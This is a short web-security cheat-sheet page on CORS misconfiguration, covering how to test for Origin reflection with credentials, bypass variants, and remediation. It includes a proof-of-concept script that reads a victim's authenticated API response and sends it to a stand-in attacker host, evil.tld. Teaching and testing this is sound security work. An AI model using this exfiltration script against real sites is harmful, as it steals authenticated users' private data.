---
tags:
  - Web
---

# :material-web-box: CORS Misconfiguration

<span class="pill pill-medium">data theft</span> <span class="pill pill-info">web</span>

A permissive CORS policy lets a malicious origin read authenticated responses from the target — turning "same-origin" data into cross-origin loot.

!!! abstract "TL;DR"
    Send an `Origin` header and watch the response. If the server reflects it in `Access-Control-Allow-Origin` **and** sets `Allow-Credentials: true`, any site can read the victim's data.

## :material-magnify: Test the reflection

```http
GET /api/me HTTP/1.1
Origin: https://evil.tld
```

Vulnerable response:

```http
Access-Control-Allow-Origin: https://evil.tld
Access-Control-Allow-Credentials: true
```

Also test dangerous shortcuts: `Origin: null` (sandboxed iframes send it), and prefix/suffix bugs like `evil-target.tld` or `target.tld.evil.tld`.

## :material-download: Exfil PoC

```html
<script>
fetch('https://target.tld/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://evil.tld/log?d=' + btoa(d)));
</script>
```

!!! opsec "Only works with a live victim"
    CORS theft needs the victim authenticated and visiting your page — it's a targeted, phishing-flavored attack, not a mass scan.

## :material-shield-check: Remediation

- Never reflect `Origin`; use a strict allowlist. Never combine `*` with credentials.
- Don't trust `Origin: null`; validate the full origin string.

## :material-link-variant: Related

- Reads data that [CSRF](csrf.md) can only write; amplified by [XSS](xss.md).
- Reference: [PortSwigger CORS](https://portswigger.net/web-security/cors).
